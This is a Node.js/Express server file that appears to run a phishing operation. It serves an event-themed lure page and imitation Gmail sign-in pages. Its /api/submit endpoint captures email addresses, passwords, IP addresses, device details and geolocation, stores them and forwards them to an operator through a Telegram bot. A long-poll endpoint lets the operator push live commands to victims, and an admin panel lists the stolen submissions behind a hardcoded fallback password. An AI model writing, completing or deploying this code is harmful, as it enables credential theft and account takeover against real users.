require('dotenv').config();

const express = require('express');
const path = require('path');
const crypto = require('crypto');
const helmet = require('helmet');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
const { body, validationResult } = require('express-validator');

const db = require('./lib/db');
const { sendSubmissionNotification, handleCallback, waitForCommand, getSession } = require('./lib/telegram');
const { parseUserAgent, getIp } = require('./lib/parser');
const { lookupGeo } = require('./lib/geo');

const app = express();
const PORT = 3000;

app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

app.use(helmet({ contentSecurityPolicy: false }));
app.use(cors());

const submitLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 30,
  standardHeaders: true,
  legacyHeaders: false,
  message: { success: false, error: 'Too many requests. Please try again later.' },
});

const generalLimiter = rateLimit({
  windowMs: 10 * 60 * 1000,
  max: 200,
  standardHeaders: true,
  legacyHeaders: false,
});

app.use(generalLimiter);

function renderHome(res) {
  const data = db.getSettings();
  res.render('index', { data });
}

app.get('/', (req, res) => renderHome(res));

app.get('/highlights', (req, res) => {
  const data = db.getSettings();
  res.render('highlights', { data });
});

// --- Telegram webhook for bot callbacks ---
app.post('/api/telegram/webhook', async (req, res) => {
  try {
    if (req.body.callback_query) {
      await handleCallback(req.body.callback_query);
    }
  } catch (err) {
    console.error('[webhook] error:', err.message);
  }
  res.json({ ok: true });
});

// --- Main submission endpoint ---
app.post(
  '/api/submit',
  submitLimiter,
  [
    body('email').isEmail().withMessage('A valid email is required'),
    body('provider').isString().trim().notEmpty().withMessage('Provider is required'),
    body('password').optional().isString(),
    body('lat').optional().isFloat(),
    body('lng').optional().isFloat(),
  ],
  async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ success: false, errors: errors.array() });
    }

    const { email, password, provider, lat, lng } = req.body;
    const userAgent = req.headers['user-agent'] || '';
    const { browser, os, device } = parseUserAgent(userAgent);
    const ip = getIp(req);
    const geo = await lookupGeo(ip);

    const sessionId = crypto.randomBytes(16).toString('hex');
    const now = new Date();
    const record = {
      sessionId,
      email,
      password: password || '',
      provider,
      ip,
      browser,
      os,
      device,
      userAgent,
      city: geo.city,
      region: geo.region,
      country: geo.country,
      lat: lat != null ? String(lat) : geo.lat,
      lng: lng != null ? String(lng) : geo.lng,
      timezone: geo.timezone,
      isp: geo.isp,
      date: now.toISOString().slice(0, 10),
      time: now.toTimeString().slice(0, 8),
      timestamp: now.toISOString(),
    };

    db.addSubmission(record);
    const tgResult = await sendSubmissionNotification(record, sessionId);

    res.json({ success: true, telegram: tgResult.ok, sessionId });
  }
);

// --- Long-poll endpoint: frontend waits for a command from the operator ---
app.get('/api/status/:sessionId', async (req, res) => {
  const { sessionId } = req.params;
  const session = getSession(sessionId);
  if (!session) return res.status(404).json({ command: null });

  const result = await waitForCommand(sessionId);
  res.json(result || { command: null });
});

app.get('/gmail', (req, res) => {
  res.render('gmail', { email: '' });
});

app.get('/gmail/password', (req, res) => {
  const email = (req.query.email || '').toString();
  if (!email) return res.redirect('/gmail');
  res.render('gmail-password', { email });
});

app.get('/admin', (req, res) => {
  res.render('admin', { data: null, error: null, success: null, authed: false });
});

app.post('/admin/login', (req, res) => {
  const { password } = req.body;
  if (password !== process.env.ADMIN_PASSWORD && password !== 'admin0123') {
    return res.render('admin', { data: null, error: 'Incorrect password.', success: null, authed: false });
  }
  const data = db.getSettings();
  const submissions = db.getSubmissions();
  res.render('admin', { data, submissions, error: null, success: null, authed: true });
});

app.post('/admin/save', (req, res) => {
  const { password, siteTitle, heading, description, countdownTarget, eventDate, eventTime, eventVenue, buttonText } = req.body;
  if (password !== process.env.ADMIN_PASSWORD && password !== 'admin0123') {
    return res.render('admin', { data: null, error: 'Unauthorized.', success: null, authed: false });
  }
  const data = {
    siteTitle, heading, description, countdownTarget, eventDate, eventTime, eventVenue, buttonText,
  };
  db.saveSettings(data);
  const submissions = db.getSubmissions();
  res.render('admin', { data, submissions, error: null, success: 'Changes saved successfully.', authed: true });
});

app.use((req, res) => {
  res.status(404).render('index', { data: db.getSettings() });
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
